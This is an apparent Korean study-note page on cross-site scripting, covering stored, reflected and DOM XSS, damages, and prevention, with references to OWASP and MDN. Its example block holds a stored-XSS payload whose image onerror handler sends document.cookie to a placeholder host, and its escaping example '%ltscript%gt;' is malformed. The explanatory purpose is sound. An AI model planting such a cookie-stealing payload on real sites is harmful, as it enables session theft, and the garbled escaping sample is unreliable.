---
layout: default
title: XSS
parent: Security
grand_parent: Browser
nav_order: 3
permalink: /browser/security/xss
---

## Cross Site Scripting (XSS)

공격자가 악의적인 스크립트를 브라우저에 주입하는 공격\
가장 흔한 웹의 취약점이라고 한다. 공격 방식은 크게 3가지가 있다.

- Stored XSS Attack
  - 게시판 / 유저의 정보 / 댓글 등에 악의적인 스크립트를 삽입하여 공격
- Reflected XSS Attack
  - 서버가 외부에서 입력 받은 값을 브라우저에게 응답하는 과정을 이용하는 공격
  - 검색 결과, 에러 메시지 등을 사용자에게 돌려줄 때 발생시킨다.
- DOM XSS Attack
  - 브라우저가 HTML DOM 구문 분석 시 DOM 생성의 일부에 실행되게 하여 DOM 환경에 영향을 끼치는 공격

## 예시

사용자가 자유롭게 HTML로 편집할 수 있는 게시글 형태에서 아래와 같은 코드를 DB에 등록.

```html
<p>안녕하세요.</p>
<script>fetch(...)</script>
<img src="X" onerror="this.src='http://xxx.xxx/?' + document.cookie;" />
```

이 데이터에 아무런 조치가 없다면\
이 게시글을 열람한 사용자는 악의적인 코드가 실행될 수 있다.

## 피해 사례

- 쿠키 / 세션 ID 탈취
  - 스크립트에서 현재 브라우저의 쿠키에 있는 사용자 인증 정보 등을 탈취한다.
- 인가되지 않은 권한 탈취
- 예민한 정보 탈취
- 사이트 피싱 (HTML을 변조하여 악의적인 링크로 유도)

## 예방법

근본적인 제거 방법은 스크립트가 실행되지 못하도록, 검증 단계에서 무효화 시키기\
데이터의 길이, 문자, 형식 등을 검사하여 안전하게 처리

- 입력 값 제한 (데이터 형식 검사)
- 입력 값 치환 (위험 문자 변환)
  - e.g. `<script>` -> `%ltscript%gt;`
- XSS 필터 도구 사용

## 참조

- [OWASP Cheat SHeet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)
- [cheat sheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
- [XSS - MDN](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
- [XSS](http://blog.plura.io/?p=7614)
